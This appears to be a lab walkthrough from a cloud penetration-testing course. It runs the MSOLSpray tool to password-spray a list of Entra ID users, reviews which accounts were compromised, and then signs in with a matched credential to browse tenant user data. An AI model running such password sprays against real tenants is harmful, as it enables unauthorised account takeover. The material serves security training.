### Run MSOLSpray to simulate a password spray attack
1. Import the MSOLSpray module
```
cd $env:SystemDrive\PentestTools\Azure\Attack\MSOLSpray
Import-Module .\MSOLSpray.ps1
```

2. Copy the users.txt file from the Exercise files directory to the MSOLSpray directory and review the contents
* This contains a list of users that will be targets for the password spray attack
```
Copy-Item -Path "$HOME\Desktop\ExerciseFiles\Modules\03\users.txt" -Destination "$env:SystemDrive\PentestTools\Azure\Attack\MSOLSpray"

Get-Content .\users.txt
```

3. Run MSOLSpray
* Replace the SPRAY_PASSWORD_FROM_THE_LAB_INFO with the password from the LabXX-Info file.
```
Invoke-MSOLSpray -UserList .\users.txt -Password "SPRAY_PASSWORD_FROM_THE_LAB_INFO" -Verbose -OutFile .\sprayresults.txt
```
** Note the non-existent users and the users with MFA configured

4. View the result
* Notice that the user with the password from the attack path output was compromised
```
Get-Content .\sprayresults.txt
```

5. Open the Entra ID portal at **`https://entra.microsoft.com/`** in an InPrivate or Incognito window. Sign in with one of the matched credentials from the sprayresults.txt file.
* You should now be able to access the Entra ID portal as the user (Identity → Users → All users). Also, you should be able to review the information of other users in the tenant! (This is the default behavior).

